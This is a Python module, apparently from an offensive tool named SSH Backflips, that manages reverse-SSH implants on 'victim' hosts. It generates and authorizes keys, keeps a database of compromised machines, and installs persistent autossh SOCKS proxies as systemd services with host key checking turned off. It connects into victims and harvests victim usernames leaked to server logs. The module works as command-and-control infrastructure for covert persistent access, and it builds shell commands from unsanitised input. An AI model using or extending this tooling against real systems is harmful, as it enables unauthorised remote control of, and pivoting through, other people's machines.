#!/usr/bin/env python3
# Copyright (c) 2024, Oracle and/or its affiliates.

import hashlib
import random
import os
import socket
import sys
import base64
import gzip
import re
import io
import ipaddress
import importlib
import shutil
from pathlib import Path
from . import settings

# ===== Utility Functions =====

def getfilehash(filename):
    sha256_hash = hashlib.sha256()
    with open(filename,"rb") as f:
        while chunk := f.read(8192):
            sha256_hash.update(chunk)
        return sha256_hash
    return None

def getfilehash_md5(filename):
    md5_hash = hashlib.md5()
    with open(filename, "rb") as f:
        while chunk := f.read(8192):
            md5_hash.update(chunk)
        return md5_hash
    return None

def getrandomwords(howmany:int):
    cleanwords = []
    with open("/usr/share/dict/words","r") as wordlist:
        dirtywords = random.sample(wordlist.read().splitlines(), howmany)
        for word in dirtywords:
            cleanwords.append(word.replace("'", "").lower())
    return cleanwords

def getfile(path):
    with open(path, "r") as f:
        return f.read()
    return None

def nocomments(stuff):
    nc = re.sub('#[^!].*$', '', stuff, 0, re.M)
    o = ""
    for l in nc.splitlines(True):
        if l.strip():
            if "log" in l:
                continue
            o += l
    return o

def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out

def gzbase(stuff):
    out = io.BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        f.write(nocomments(stuff).encode())
    return base64.b64encode(out.getvalue()).decode('utf-8')

def check_port(port, host='127.0.0.1'):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((host, port))
    if result == 0:
        return True
    else:
        return False

# ===== Core Classes =====

class BackflipManager:
    """Manages backflip instances using an SSH config file as a database."""

    def __init__(self, config_path=None):
        """Initialize the backflip manager with the SSH config database path."""
        self.config_path = config_path or settings.BACKFLIPS_DB
        self._backflips = {}
        self._ports = set()
        self._load_config()

    def _load_config(self):
        """Load and parse the SSH config file into memory."""
        self._backflips.clear()
        self._ports.clear()
        current_host = None
        current_config = {}

        try:
            with open(self.config_path, "r") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('##'):  # Skip section markers
                        continue

                    if line.startswith('Host '):
                        if current_host:
                            self._backflips[current_host] = current_config
                        current_host = line.split()[1]
                        current_config = {'Host': current_host}
                    elif line.startswith('#SOCKS '):  # Handle SOCKS proxy state
                        current_config['SOCKS'] = line.split(' ', 1)[1]
                    elif line.startswith(('User ', 'Hostname ', 'Port ', 'IdentityFile ')):
                        key, value = line.strip().split(' ', 1)
                        current_config[key] = value
                        if key == 'Port':
                            self._ports.add(int(value))

                if current_host:
                    self._backflips[current_host] = current_config

        except FileNotFoundError:
            # Create new config file if it doesn't exist
            with open(self.config_path, "w") as f:
                f.write(f"# SSH-Backflips ssh_config\n\nHost *\nControlMaster Auto\nControlPath {settings.controlMasters}/%r@%h:%p\nControlPersist 666")

    def _save_config(self):
        """Save the current configuration to file."""
        with open(f"{self.config_path}.old", "w") as f:
            with open(self.config_path, "r") as current:
                f.write(current.read())

        with open(self.config_path, "w") as f:
            f.write("# SSH-Backflips ssh_config\n\n")
            for hostname, config in self._backflips.items():
                if hostname == '*':  # Skip global settings
                    continue
                f.write(f"## SSH Backflip instance: Target Hostname: {hostname}\n")
                f.write(f"Host {hostname}\n")
                for key, value in config.items():
                    if key == 'Host':
                        continue
                    elif key == 'SOCKS':
                        f.write(f"    #SOCKS {value}\n")
                    else:
                        f.write(f"    {key} {value}\n")
                f.write(f"## End SSH Backflip instance {hostname}\n\n")

    def exists_backflip(self, backflip_name):
        """Check if a backflip instance exists."""
        return backflip_name in self._backflips

    def exists_port(self, port):
        """Check if a port is already allocated."""
        return int(port) in self._ports

    def get_available_port(self):
        """Find the next available port for a backflip instance."""
        print("Finding the next available port for an ssh backflip instance.")
        unused = {n for n in range(4001, 5000)}.difference(self._ports)
        return sorted(unused)[0]

    def locate_backflip(self, backflip_name):
        """Find the location of a backflip instance in the config file."""
        if not self.exists_backflip(backflip_name):
            return -1, -1, []

        start = -1
        end = -1
        instance_lines = []

        with open(self.config_path, "r") as f:
            lines = f.readlines()
            for i, line in enumerate(lines):
                if f"## SSH Backflip instance: Target Hostname: {backflip_name}" in line:
                    start = i
                elif start != -1 and f"## End SSH Backflip instance {backflip_name}" in line:
                    end = i
                    instance_lines = lines[start:end+1]
                    break

        return start, end, instance_lines

    def list_backflips(self):
        """List all backflip instances in the database."""
        print(f"\nListing SSH Backflip instances from database {self.config_path}:\n")
        for hostname, config in self._backflips.items():
            if hostname == '*':  # Skip global settings
                continue
            print(f"Backflip Instance: {hostname}")
            print("=" * (18 + len(hostname)))
            print(f"  Username:     {config.get('User', 'N/A')}")
            print(f"  Target Host:  {config.get('Hostname', 'N/A')}")
            print(f"  Local Port:   {config.get('Port', 'N/A')}")
            print(f"  Identity:     {config.get('IdentityFile', 'N/A')}")
            if 'SOCKS' in config:
                socks_unit = Path(config['SOCKS'])
                socks_port = int(config['Port']) - 1000
                print(f"  SOCKS Proxy:  Enabled (port {socks_port})")
                print(f"               Service: {socks_unit.name}")
            else:
                print("  SOCKS Proxy:  Disabled")
            print()

    def delete_backflip(self, backflip_name):
        """Delete a backflip instance from the database."""
        if not self.exists_backflip(backflip_name):
            print(f"Couldn't find a backflip instance with the name {backflip_name} in the database. Check the available instances with the 'list' command")
            return False

        print(f"Deleting backflip instance: {backflip_name}")
        start, end, instance = self.locate_backflip(backflip_name)

        if start == -1 or end == -1:
            return False

        # Get the port and IP for cleaning up known_hosts
        config = self._backflips[backflip_name]
        victim_port = config['Port']
        internal_ip = config['Hostname']

        # Backup the current config
        self._save_config()

        # Write the new config without the deleted instance
        with open(self.config_path, "r") as f:
            lines = f.readlines()

        with open(self.config_path, "w") as f:
            f.writelines(lines[:start] + lines[end+2:])

        # Clean up known_hosts
        os.system(f'ssh-keygen -f "/root/.ssh/known_hosts" -R "[{internal_ip}]:{victim_port}"')

        # Reload the config
        self._load_config()
        return True

    def add_backflip(self, victim):
        """Add a new backflip instance to the database."""
        if self.exists_backflip(victim.hostname):
            print(f"A backflip instance named '{victim.hostname}' already exists, select a different name.")
            return False

        if self.exists_port(victim.port):
            print(f"Port '{victim.port}' is already allocated, select a different one.")
            return False

        instance = f"""## SSH Backflip instance: Target Hostname: {victim.hostname}
Host {victim.hostname}
    User {victim.username}
    Hostname {victim.backflipServer.ip}
    Port {victim.port}
    IdentityFile {victim.privKeyPath}
## End SSH Backflip instance {victim.hostname}
\n"""

        with open(self.config_path, "a") as f:
            f.write(instance)

        # Reload the config
        self._load_config()
        return True

    def socks_on(self, backflip_name):
        """Enable SOCKS proxy for a backflip instance."""
        if not self.exists_backflip(backflip_name):
            print(f"Couldn't find a backflip instance with host name {backflip_name} in the database {self.config_path}")
            return False

        print(f"Starting SOCKS proxy for SSH Backflip target: {backflip_name}")
        config = self._backflips[backflip_name]
        internal_ip = config['Hostname']
        victim_port = int(config['Port'])
        socks_port = victim_port - 1000

        # Check if victim is connected
        if not check_port(victim_port, internal_ip):
            print(f"Victim does not appear to be connected. TCP port {victim_port} of {internal_ip} is not listening. The victim must be connected to enable the SOCKS proxy.")
            return False

        # Check if SOCKS port is available
        if check_port(socks_port, internal_ip):
            print(f"Port {socks_port} of {internal_ip} is in use, can't start the SOCKS proxy. Please release the port so backflips can use it")
            return False

        # Create systemd service unit
        systemd_unit_path = Path(f"/etc/systemd/system/backflip-socks-{backflip_name}-{victim_port}.service")
        template_unit_socks = f"""[Unit]
Description=SSH backflip SOCKS proxy to {backflip_name}
After=network.target auditd.service

[Service]
ExecStart=/usr/bin/autossh -M0 -F {self.config_path} -oServerAliveInterval=30 -oServerAliveCountMax=5 -oUserKnownHostsFile=/dev/null -oStrictHostKeyChecking=no -oBatchMode=yes -n -N -D :{socks_port} {backflip_name}
Restart=on-failure
RestartSec=30s

[Install]
WantedBy=multi-user.target
"""
        print(f"Writing systemd service unit file {systemd_unit_path}\n")
        print(f"{template_unit_socks}\n")
        with open(systemd_unit_path, "w") as f:
            f.write(template_unit_socks)

        os.system("systemctl daemon-reload")
        socks_service_name = os.path.basename(str(systemd_unit_path))

        if not os.system(f"systemctl start {socks_service_name}"):
            print(f"Failed to start the autossh SOCKS service. You may need to manually troubleshoot the service unit.")
            systemd_unit_path.unlink()
            return False

        os.system(f"systemctl enable {socks_service_name}")

        # Update config with SOCKS state
        config['SOCKS'] = str(systemd_unit_path)
        self._save_config()

        print(f"SOCKS proxy has been enabled for {backflip_name} on port {socks_port}.\n Have a nice day!")
        return True

    def socks_off(self, backflip_name):
        """Disable SOCKS proxy for a backflip instance."""
        if not self.exists_backflip(backflip_name):
            print(f"Couldn't find a backflip instance with host name {backflip_name} in the database {self.config_path}")
            return False

        print(f"Stopping SOCKS proxy for SSH Backflip target: {backflip_name}")
        config = self._backflips[backflip_name]

        if 'SOCKS' not in config:
            print(f"No SOCKS proxy found for {backflip_name}")
            return False

        systemd_unit_path = Path(config['SOCKS'])
        if not systemd_unit_path.exists():
            print(f"Couldn't find the backflip SOCKS autossh service unit file for {backflip_name} at expected path: {systemd_unit_path}")
            return False

        socks_service_name = os.path.basename(str(systemd_unit_path))
        os.system(f"systemctl stop {socks_service_name}")
        os.system(f"systemctl disable {socks_service_name}")
        systemd_unit_path.unlink()
        os.system("systemctl daemon-reload")

        # Remove SOCKS state from config
        del config['SOCKS']
        self._save_config()

        print(f"SOCKS proxy has been disabled for {backflip_name}.\n Have a nice day!")
        return True

class Server:
    def __init__(self, serverName, callbackPort = settings.BACKFLIP_PORT, callbackIP = settings.BACKFLIP_IP,
                 callbackHost = settings.BACKFLIP_SERVER, backflipUser = settings.BACKFLIP_USER):
        self.name = serverName
        self.port = callbackPort
        self.ip = callbackIP
        self.fqdn = callbackHost
        self.user = backflipUser
        self.hostKey = None
        self.hostKeyPath = f"{settings.KEYS_DIR}/{self.name}-hostkey.pub"

        # Get server's hostkey for victim's known_hosts
        os.system(f"echo \"{self.name} $(ssh-keyscan -p {self.port} -t ed25519 {self.fqdn} 2>/dev/null | cut -d ' ' -f2-)\">{self.hostKeyPath}")
        self.hostKey = getfile(self.hostKeyPath).strip()

    def __str__(self) -> str:
        return f'Server("name:{self.name}", "ip:{self.ip}", "fqdn:{self.fqdn}", "user:{self.user}", "port:{self.port}", "hostKey:{self.hostKey}"'

    def load_config(self, config):
        if self.name == 'DEFAULT':
            return

        if not config.has_section(self.name):
            print(f"The Backflips server name you provided '{self.name}' was not found in the configuration (etc/backflips.conf). You must first add a server, then you can use it")
            sys.exit(1)

        self.port = config.get(self.name, "callbackPort")
        self.ip = config.get(self.name, "internalIP")
        self.fqdn = config.get(self.name, "callbackHost")
        self.user = config.get(self.name, "callbackUser")

class Victim:
    def __init__(self, backflipServer, victimHostname, victimUsername=None, victimPort=None):
        self.username = victimUsername
        self.hostname = victimHostname
        self.port = victimPort
        self.privKeyPath = None
        self.privKey = None
        self.pubKeyPath = None
        self.pubKey = None
        self.backflipServer = backflipServer

        # Initialize the backflip manager
        self._manager = BackflipManager()

        if self.port is None:
            self.port = self._manager.get_available_port()
        if self.username is None:
            self.username = f"{getrandomwords(1)[0]}_victim"
            print(f"""\n[!!!] You didn't provide the victim username. Their username is necessary for connecting into the victim host.\n\tThe first time the backflip implant runs it will do a faceplant, aka leak the victim username through a connection attempt to the backflip server. \n\t Look for the victim username in the backflip server ssh logs like this:\n\t\t'sudo journalctl -u ssh-backflips -S 2024-10-12 | grep "user {self.username.split("_")[0]}"'\n\tThen update the backflips database with that username.\n""")
        self.keygen()
        self.commit()

    def __str__(self) -> str:
        return f'Victim("username:{self.username}", "hostname:{self.hostname}", "victimPort:{self.port}")'

    def keygen(self):
        keyPath = f"{settings.KEYS_DIR}/{self.username}-{self.hostname}-{self.backflipServer.fqdn}"
        if not Path(keyPath).exists():
            print ("[*] generating new set of rsa keys")
            os.system(f"ssh-keygen -t rsa -b 2048 -C '' -q -f '{keyPath}' -N ''")
            print ("[*] adding key to authorized_keys on our backflips server")
            os.system(f"echo '' >> {settings.AUTHORIZED_KEYS}")
            os.system(f"cat '{keyPath}.pub' >> {settings.AUTHORIZED_KEYS}")

        self.pubKeyPath = f"{keyPath}.pub"
        self.pubKey = getfile(self.pubKeyPath)
        self.privKeyPath = keyPath
        self.privKey = getfile(self.privKeyPath)

    def commit(self):
        if not self.privKeyPath:
            print("This victim doesn't have keys yet. You must run victim.keygen() first.")
            quit()
        self._manager.add_backflip(self)

# ===== Command Implementation Functions =====

def setup_backflip(args):
    """Implements the 'backflip new' command"""
    bfServer = 'DEFAULT' if args.backflipServer is None else args.backflipServer
    servidor = Server(bfServer)
    servidor.load_config(settings.config)
    victima = Victim(servidor, args.targetHost, args.targetUser, args.localPort)
    makeimplant(servidor, victima, args)

def list_backflips(args):
    """Implements the 'backflip list' command"""
    manager = BackflipManager()
    manager.list_backflips()

def delete_backflip(args):
    """Implements the 'backflip delete' command"""
    manager = BackflipManager()
    manager.delete_backflip(args.targetHost)

def connect_backflip(args):
    """Implements the 'backflip connect' command"""
    manager = BackflipManager()
    if manager.exists_backflip(args.targetHost):
        print(f"Connecting to SSH Backflip target: {args.targetHost}")
        os.system(f"ssh -F {settings.BACKFLIPS_DB} {args.targetHost}")
    else:
        print(f"Couldn't find a backflip instance with host name {args.targetHost} in the database {settings.BACKFLIPS_DB}")

def manage_socks(args):
    """Implements the 'backflip socks' command"""
    manager = BackflipManager()
    if args.socksToggle:
        manager.socks_on(args.targetHost)
    elif args.socksToggle is False:
        manager.socks_off(args.targetHost)

def check_faceplant(args):
    """Implements the 'backflip check-faceplant' command"""
    import datetime
    import re
    import subprocess

    manager = BackflipManager()

    # Use provided date or default to today
    if args.searchDate:
        try:
            # Validate date format
            search_date = datetime.datetime.strptime(args.searchDate, "%Y-%m-%d").strftime("%Y-%m-%d")
        except ValueError:
            print("Error: Date must be in YYYY-MM-DD format")
            return
    else:
        search_date = datetime.date.today().strftime("%Y-%m-%d")

    print(f"Searching logs from {search_date} onwards...")

    # Get all backflip instances
    for hostname, config in manager._backflips.items():
        if hostname == '*':  # Skip global settings
            continue

        username = config.get('User', '')
        if not username or not '_victim' in username:
            continue

        # Extract the random word part before '_victim'
        search_word = username.split('_')[0]

        # Search the SSH logs for faceplant attempts
        cmd = f'sudo journalctl -u ssh-backflips -S {search_date} | grep "user {search_word}"'
        try:
            output = subprocess.check_output(cmd, shell=True, text=True)

            # Look for the first line that contains the leaked username
            for line in output.splitlines():
                # Try to extract the leaked username using regex
                match = re.search(fr'user {search_word}-(\w+)', line)
                if match:
                    leaked_user = match.group(1)
                    if leaked_user != username:
                        print(f"\nFound potential username leak for {hostname}:")
                        print(f"Current username in database: {username}")
                        print(f"Leaked username from logs: {leaked_user}")

                        response = input(f"\nDo you want to update the username for {hostname} to {leaked_user}? (y/n): ")
                        if response.lower() == 'y':
                            # Update the username in the config
                            config['User'] = leaked_user
                            manager._save_config()
                            print(f"Updated username for {hostname} to {leaked_user}")
                        break
        except subprocess.CalledProcessError as e:
            print(f"Error searching logs for {hostname}: {e}")
            continue

    print("\nFaceplant check completed.")

# ===== Listener Management Functions =====

def manage_servers(args):
    """Implements the 'listener' command"""
    if args.serverAction == "list":
        list_servers()
    elif args.serverAction == "add":
        add_server(args.name, args.callbackHost, args.internalIP, args.callbackPort, args.callbackUser)
    elif args.serverAction == "delete":
        remove_server(args.name)
    elif args.serverAction == "reconcile":
        reconcile_container_ip()
    else:
        print("Unknown action for managing backflip servers")
        sys.exit(1)

def list_servers(config = settings.config):
    """Helper function to list configured listeners in a human-readable format."""
    print("\nConfigured SSH Backflip Listeners:\n")
    for server in config.sections():
        print(f"Listener name: {server}")
        print("=" * (9 + len(server)))
        for key, value in config.items(server):
            # Convert config keys to more readable format
            if key == "callbackHost":
                print(f"  Public Address: {value}")
            elif key == "internalIP":
                print(f"  Internal IP:    {value}")
            elif key == "callbackPort":
                print(f"  Listen Port:    {value}")
            elif key == "callbackUser":
                print(f"  Auth User:      {value}")
            else:
                print(f"  {key}: {value}")
        print() # Add blank line between servers

def add_server(name, callbackHost, internalIP, callbackPort, callbackUser, config = settings.config):
    """Helper function to add a new listener"""
    try:
        validatedIP = str(ipaddress.ip_address(internalIP))
    except:
        print(f"This is not a valid IP address {internalIP}")
        sys.exit(1)

    try:
        config.add_section(name)
    except:
        print(f"Couldn't add new server with name {name}")
        sys.exit(1)

    config.set(name, "callbackHost", callbackHost)
    config.set(name, "internalIP", validatedIP)
    config.set(name, "callbackPort", callbackPort)
    config.set(name, "callbackUser", callbackUser)
    commit_server_config(config)
    print(f"Server {name} has been added to backflips.conf. You can use the 'list' command to view the details")

def remove_server(name, config = settings.config):
    """Helper function to remove a listener"""
    try:
        config.remove_section(name)
    except:
        print(f"could not delete {name}")
        sys.exit(1)

    commit_server_config(config)
    print(f"Server {name} has been deleted from backflips.conf")

def reconcile_container_ip(config = settings.config, containerIPs = settings.containerIPs):
    """Helper function to update listener IPs from container mapping"""
    for server in config.sections():
        if server in containerIPs:
            config.set(server, "internalIP", containerIPs[server])
            print(f"Server {server} internal IP has been updated to {containerIPs[server]} from the container IP mapping file")

    commit_server_config(config)

def commit_server_config(config = settings.config, configPath = settings.configPath):
    """Helper function to save listener configuration changes"""
    try:
        shutil.copyfile(configPath, f"{configPath}.backup")
    except:
        print("Couldn't make configuration backup before modification")
        sys.exit(1)

    with open(configPath, "w") as configFile:
        config.write(configFile)

# ===== Implant Generation =====

def makeimplant(backflipServer, victim, args):
    """Helper function to generate OS-specific implant"""
    implantMod = importlib.import_module(f"sshbackflip.{args.targetOS}")
    implantMod.makebackflip(backflipServer, victim, args)